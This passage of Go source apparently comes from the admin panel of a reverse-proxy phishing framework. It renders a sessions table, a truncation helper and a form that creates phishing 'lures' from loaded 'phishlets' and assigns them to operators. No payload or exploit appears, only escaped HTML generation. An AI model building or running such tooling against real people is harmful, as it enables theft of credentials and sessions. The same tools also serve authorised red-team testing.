<button type="submit" class="btn btn-danger btn-xs">Del</button>
</form></td>`, sess.Id))
		}
		b.WriteString(`</tr>`)
	}
	b.WriteString(`</tbody></table></div>`)
	return b.String()
}

func truncateStr(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

func createLureForm(phishletNames []string, userList []*database.User) string {
	if len(phishletNames) == 0 {
		return `<div class="empty">No phishlets loaded. Add phishlet YAML files to the phishlets directory first.</div>`
	}
	opts := ""
	for _, name := range phishletNames {
		opts += fmt.Sprintf(`<option value="%s">%s — %s</option>`,
			template.HTMLEscapeString(name),
			template.HTMLEscapeString(name),
			phishletFriendlyName(name))
	}
	userOpts := `<option value="">— no user —</option>`
	for _, u := range userList {
		userOpts += fmt.Sprintf(`<option value="%s">%s</option>`,
			template.HTMLEscapeString(u.Username), template.HTMLEscapeString(u.Username))
	}
	return fmt.Sprintf(`<div class="card"><form method="POST" action="/admin/panel?tab=lures">
<input type="hidden" name="action" value="create_lure">
<div class="form-grid">
  <div class="field"><label class="field-label">Phishlet</label><select name="phishlet" required>%s</select></div>
  <div class="field"><label class="field-label">Path (auto if empty)</label><input type="text" name="path" placeholder="/abc12345"></div>
  <div class="field"><label class="field-label">Redirect URL (optional)</label><input type="text" name="redirect_url" placeholder="https://..."></div>
  <div class="field"><label class="field-label">Assign to User</label><select name="user_id">%s</select></div>
  <div class="field" style="justify-content:flex-end"><button type="submit" class="btn btn-primary">+ Create Lure</button></div>
</div>
</form></div>`, opts, userOpts)
}
